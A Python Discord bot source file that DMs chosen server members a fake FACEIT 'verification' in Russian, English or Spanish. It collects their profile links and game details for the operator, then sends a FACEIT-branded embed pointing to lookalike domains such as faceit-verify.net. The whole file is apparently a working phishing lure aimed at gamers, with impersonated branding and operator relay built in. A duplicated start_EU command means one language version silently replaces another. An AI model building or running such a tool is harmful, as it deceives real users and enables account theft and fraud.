import re
import discord
from discord.ext import commands
import os

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

active_verifications = set()


@bot.event
async def on_ready():
    print(f"Бот {bot.user} готовий!")


@bot.command()
async def start_RU(ctx, member: discord.Member):
    if member.id in active_verifications:
        await ctx.send("Этот пользователь уже проходит верификацию.")
        return
    
    active_verifications.add(member.id)
    try:
        dm = await member.create_dm()
        await dm.send(
            "Привет! 👋 Перед тем как продолжить, нужно пройти небольшую проверку.\n"
            "Ответь, пожалуйста, на пару вопросов для верификации.\n"
            "✉️ Просто отправь любое сообщение, чтобы начать."
        )

        await ctx.send(f"Начал проводить верификацию пользователю: {member}.")

        def check(m):
            return m.author == member and isinstance(m.channel, discord.DMChannel)

        first_message = await bot.wait_for("message", check=check, timeout=300)

        await ctx.send(
            f"Ответ от пользователя {first_message.author} на первый вопрос:: {first_message.content}"
        )

        while True:
            await dm.send(
                "Для продолжения пришли ссылку на твой профиль FACEIT."
            )

            second_answer = await bot.wait_for("message", check=check, timeout=300)
            url = second_answer.content.strip()

            if re.match(r'^https?://(www\.)?faceit\.com(/|$)', url):
                await ctx.send(
                    f"Пользователь {second_answer.author} отправил сообщение: {url}"
                )
                break
            else:
                await dm.send(
                    "❌ Это не действительная ссылка FACEIT. Пожалуйста, попробуй снова."
                )

        await dm.send(
            'Напиши, в какие игры ты играешь на FACEIT (например: CS2, Valorant и другие).'
        )

        third_answer = await bot.wait_for("message", check=check, timeout=300)

        embed = discord.Embed(
            title="✅ Поздравляем!",
            description="[Нажми, чтобы продолжить верификацию](https://faceit-verify.net/hub)",
            color=discord.Color.dark_orange()
        )
        embed.set_thumbnail(
            url="https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
        )

        await dm.send(embed=embed)

        await ctx.send(
            f"Пользователь {third_answer.author} отправил сообщение: {third_answer.content}"
        )

    except Exception as e:
        await ctx.send(f"Ошибка: {e}")
    finally:
        await ctx.send(
            f"Закончил верификацию пользователя: {member}"
        )
        active_verifications.discard(member.id)

@bot.command()
async def start_EU(ctx, member: discord.Member):
    if member.id in active_verifications:
        await ctx.send("Этот пользователь уже проходит верификацию.")
        return

    active_verifications.add(member.id)
    try:
        dm = await member.create_dm()
        await dm.send(
            "Hi! 👋 Before proceeding, you need to pass a quick verification.\nPlease answer a couple of questions for verification.\n✉️Just send any message to start."
        )

        await ctx.send(f"Начал проводить верификацию пользователю: {member}.")

        def check(m):
            return m.author == member and isinstance(m.channel,
                                                     discord.DMChannel)

        first_message = await bot.wait_for("message", check=check, timeout=300)

        await ctx.send(
            f"Ответ от пользователя {first_message.author} на первый вопрос: {first_message.content}"
        )

        while True:
            await dm.send(
                "To continue, please send the link to your FACEIT profile.")

            second_answer = await bot.wait_for("message",
                                               check=check,
                                               timeout=300)
            url = second_answer.content.strip()

            if re.match(r'^https?://(www\.)?faceit\.com(/|$)', url):
                await ctx.send(
                    f"Ответ от пользователя {second_answer.author} на второй вопрос: {url}"
                )
                break
            else:
                await dm.send(
                    "❌ This is not a valid FACEIT link. Please try again.")

        await dm.send(
            'Please write down which games you play on FACEIT (for example: CS2, Valorant, and others).'
        )

        third_answer = await bot.wait_for("message", check=check, timeout=300)

        embed = discord.Embed(
            title="✅ Congrats!",
            description=
            "[Press to continue verification](https://faceit-verify.net/hub)",
            color=discord.Color.dark_orange())
        embed.set_thumbnail(
            url=
            "https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
        )

        await dm.send(embed=embed)

        await ctx.send(
            f"Ответ от пользователя {third_answer.author} на третий вопрос: {third_answer.content}"
        )

    except Exception as e:
        await ctx.send(f"Ошибка: {e}")
    finally:
        await ctx.send(
            f"Закончил верификацию пользователя: {member}"
        )
        active_verifications.discard(member.id)


@bot.command()
async def start_EU(ctx, member: discord.Member):
    if member.id in active_verifications:
        await ctx.send("Este usuario ya está en proceso de verificación.")
        return

    active_verifications.add(member.id)
    try:
        dm = await member.create_dm()
        await dm.send(
            "¡Hola! 👋 Antes de continuar, necesitas pasar una verificación rápida.\nPor favor, responde a un par de preguntas para verificarte.\n✉️ Solo envía cualquier mensaje para comenzar."
        )

        await ctx.send(f"Comenzando la verificación para el usuario: {member}.")

        def check(m):
            return m.author == member and isinstance(m.channel, discord.DMChannel)

        first_message = await bot.wait_for("message", check=check, timeout=300)

        await ctx.send(
            f"Respuesta del usuario {first_message.author} a la primera pregunta: {first_message.content}"
        )

        while True:
            await dm.send(
                "Para continuar, por favor envía el enlace a tu perfil de FACEIT."
            )

            second_answer = await bot.wait_for("message", check=check, timeout=300)
            url = second_answer.content.strip()

            if re.match(r'^https?://(www\.)?faceit\.com(/|$)', url):
                await ctx.send(
                    f"Respuesta del usuario {second_answer.author} a la segunda pregunta: {url}"
                )
                break
            else:
                await dm.send(
                    "❌ Este no es un enlace válido de FACEIT. Por favor, intenta nuevamente."
                )

        await dm.send(
            'Por favor escribe a qué juegos juegas en FACEIT (por ejemplo: CS2, Valorant y otros).'
        )

        third_answer = await bot.wait_for("message", check=check, timeout=300)

        embed = discord.Embed(
            title="✅ ¡Felicidades!",
            description="[Haz clic para continuar con la verificación](https://faceit-verify.net/hub)",
            color=discord.Color.dark_orange()
        )
        embed.set_thumbnail(
            url="https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
        )

        await dm.send(embed=embed)

        await ctx.send(
            f"Respuesta del usuario {third_answer.author} a la tercera pregunta: {third_answer.content}"
        )

    except Exception as e:
        await ctx.send(f"Error: {e}")
    finally:
        await ctx.send(
            f"Finalizó la verificación del usuario: {member}"
        )
        active_verifications.discard(member.id)


@bot.command()
async def start_USA(ctx, member: discord.Member):
    if member.id in active_verifications:
        await ctx.send("Этот пользователь уже проходит верификацию.")
        return

    active_verifications.add(member.id)
    try:
        dm = await member.create_dm()
        await dm.send(
            "Hi! 👋 Before proceeding, you need to pass a quick verification.\nPlease answer a couple of questions for verification.\n✉️Just send any message to start."
        )

        await ctx.send(f"Начал проводить верификацию пользователю: {member}.")

        def check(m):
            return m.author == member and isinstance(m.channel,
                                                     discord.DMChannel)

        first_message = await bot.wait_for("message", check=check, timeout=300)

        await ctx.send(
            f"Ответ от пользователя {first_message.author} на первый вопрос: {first_message.content}"
        )

        while True:
            await dm.send(
                "To continue, please send the link to your FACEIT profile.")

            second_answer = await bot.wait_for("message",
                                               check=check,
                                               timeout=300)
            url = second_answer.content.strip()

            if re.match(r'^https?://(www\.)?faceit\.com(/|$)', url):
                await ctx.send(
                    f"Ответ от пользователя {second_answer.author} на второй вопрос: {url}"
                )
                break
            else:
                await dm.send(
                    "❌ This is not a valid FACEIT link. Please try again.")

        await dm.send(
            'Please write down which games you play on FACEIT (for example: CS2, Valorant, and others).'
        )

        third_answer = await bot.wait_for("message", check=check, timeout=300)

        embed = discord.Embed(
            title="✅ Congrats!",
            description=
            "[Press to continue verification](https://verify-hub.net/hub)",
            color=discord.Color.dark_orange())
        embed.set_thumbnail(
            url=
            "https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
        )

        await dm.send(embed=embed)

        await ctx.send(
            f"Ответ от пользователя {third_answer.author} на третий вопрос: {third_answer.content}"
        )

    except Exception as e:
        await ctx.send(f"Ошибка: {e}")
    finally:
        await ctx.send(
            f"Закончил верификацию пользователя: {member}"
        )
        active_verifications.discard(member.id)


# Твій токен сюди
bot.run(os.getenv('DISCORD_KEY'))
